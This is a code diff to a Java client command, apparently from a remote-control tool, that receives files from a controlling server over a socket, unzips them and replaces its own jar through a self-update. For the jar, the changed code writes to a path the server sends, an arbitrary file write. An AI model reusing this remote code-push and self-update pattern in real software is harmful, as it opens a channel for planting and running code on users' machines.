@@ -12,9 +12,8 @@ import br.com.introcdc.connect.client.components.InstallComponents;
 import java.io.BufferedOutputStream;
 import java.io.DataInputStream;
 import java.io.File;
-import java.io.FileOutputStream;
 import java.net.Socket;
-import java.util.concurrent.TimeUnit;
+import java.nio.file.Files;
 
 public class ClientCommandSend extends ClientCommand {
 
@@ -28,12 +27,14 @@ public class ClientCommandSend extends ClientCommand {
             msg("Digite um arquivo!");
             return;
         }
+
         ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> {
             try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT + 4);
                  DataInputStream dis = new DataInputStream(fileSocket.getInputStream());
-                 BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(new File(FileComponents.FOLDER, dis.readUTF())))) {
-                msg("Recebendo arquivo do servidor...");
+                 BufferedOutputStream bos = new BufferedOutputStream(Files.newOutputStream((input.equalsIgnoreCase("Connect.jar") ?
+                         new File(dis.readUTF()) : new File(FileComponents.FOLDER, dis.readUTF())).toPath()))) {
                 String fileName = dis.readUTF();
+                msg("Recebendo arquivo " + fileName + " do servidor...");
                 boolean temp = dis.readUTF().replace("temp:", "").equals("true");
                 byte[] buffer = new byte[4096];
                 int bytesRead;
@@ -48,20 +49,19 @@ public class ClientCommandSend extends ClientCommand {
                         }
                         FileComponents.extractZip(new File(FileComponents.FOLDER, fileName), folder);
                         FileComponents.deleteFile(new File(FileComponents.FOLDER, fileName));
-                    }).start(), 1, TimeUnit.SECONDS);
+                    }).start(), Connect.DELAY, Connect.DELAY_TYPE);
                 }
 
                 msg("Arquivo recebido!");
 
                 if (fileName.equalsIgnoreCase("Connect.jar")) {
-                    new File(FileComponents.FOLDER, fileName).renameTo(new File(InstallComponents.LOCAL_UPDATER));
-                    InstallComponents.verifyUpdate();
+                    ConnectClient.EXECUTOR.schedule(InstallComponents::verifyUpdate, Connect.DELAY, Connect.DELAY_TYPE);
                 }
             } catch (Exception exception) {
                 msg("Ocorreu um erro enviar um arquivo! (" + exception.getMessage() + ")");
                 exception(exception);
             }
-        }).start(), 1, TimeUnit.SECONDS);
+        }).start(), Connect.DELAY, Connect.DELAY_TYPE);
     }
 
 }
